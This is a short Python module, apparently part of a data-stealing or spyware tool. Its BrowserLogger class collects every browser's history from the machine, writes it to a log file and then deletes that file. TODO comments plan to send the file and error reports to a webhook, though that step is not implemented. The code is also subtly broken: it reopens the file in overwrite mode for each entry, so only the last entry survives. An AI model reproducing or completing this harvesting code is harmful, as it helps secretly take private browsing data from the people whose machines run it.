from utils import *

import browserhistory as bh
import os

class BrowserLogger:
    def __init__(self):
        self.logs_path = get_logs_path()
        self.config: dict = load_config("browser")

    def start(self):
        try:
            if self.config["enabled"]:
                if self.config["only_on_first_run"]:
                    if not is_first_run():
                        return
                browser_history = bh.get_browserhistory()
                for browser, history in browser_history.items():
                    for search in history:
                        with open(os.path.join(self.logs_path, "browser.txt"), "w") as f:
                            f.write(f"{browser} - {search[2]}: {search[1]} - {search[0]}\n")
                if not browser_history:
                    #print("No browser history found.")
                    # TODO send to webhook that no browser history was found
                    pass
                # TODO send the file to the webhook
                os.remove(os.path.join(self.logs_path, "browser.txt"))
        except Exception as e:
            print(f"Error in BrowserLogger: {e}")
            # TODO send to webhook that an error occurred